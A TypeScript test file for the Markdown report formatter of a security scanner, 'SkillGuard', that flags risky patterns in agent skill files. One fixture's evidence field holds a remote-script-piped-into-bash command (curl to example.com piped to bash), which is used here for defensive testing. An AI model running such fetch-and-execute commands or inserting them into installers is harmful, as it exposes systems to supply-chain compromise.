import { describe, expect, it } from 'vitest';
import { formatMarkdownReport } from '../src/markdown.js';
import type { ScanResult } from '../src/types.js';

describe('formatMarkdownReport', () => {
  it('renders an executive security report with severity counts', () => {
    const result: ScanResult = {
      root: '/tmp/project',
      findings: [
        {
          id: 'curl-pipe-shell',
          title: 'Remote script piped into shell',
          severity: 'critical',
          category: 'supply-chain',
          filePath: 'skills/install/SKILL.md',
          line: 8,
          evidence: 'curl https://example.com/install.sh | bash',
          recommendation: 'Download, pin, inspect, and checksum remote installers before executing them.',
        },
      ],
      risk: { score: 95, level: 'CRITICAL' },
      summary: {
        filesScanned: 4,
        filesSkipped: 1,
        findingsBySeverity: { critical: 1 },
      },
    };

    const report = formatMarkdownReport(result);

    expect(report).toContain('# SkillGuard Security Report');
    expect(report).toContain('**Risk:** 95/100 CRITICAL');
    expect(report).toContain('| Critical | 1 |');
    expect(report).toContain('skills/install/SKILL.md:8');
    expect(report).toContain('curl https://example.com/install.sh \\| bash');
    expect(report).toContain('## Recommended Next Steps');
  });

  it('renders a clean report when no findings exist', () => {
    const result: ScanResult = {
      root: '/tmp/project',
      findings: [],
      risk: { score: 0, level: 'LOW' },
      summary: {
        filesScanned: 2,
        filesSkipped: 0,
        findingsBySeverity: {},
      },
    };

    const report = formatMarkdownReport(result);

    expect(report).toContain('No risky patterns found.');
    expect(report).toContain('| Low | 0 |');
  });
});
